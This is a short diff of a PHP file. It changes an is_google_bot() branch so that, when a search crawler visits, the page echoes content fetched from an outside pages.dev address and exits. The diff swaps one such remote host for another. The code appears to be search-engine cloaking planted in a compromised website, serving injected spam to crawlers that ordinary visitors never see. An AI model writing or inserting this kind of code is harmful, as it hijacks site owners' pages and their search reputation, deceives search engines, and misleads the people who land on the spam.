@@ -19,7 +19,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
-    echo file_get_contents("https://zonahijaubos.pages.dev/index.txt");
+    echo file_get_contents("https://masterwincun.pages.dev/index.txt");
     exit;
 }
 ?>
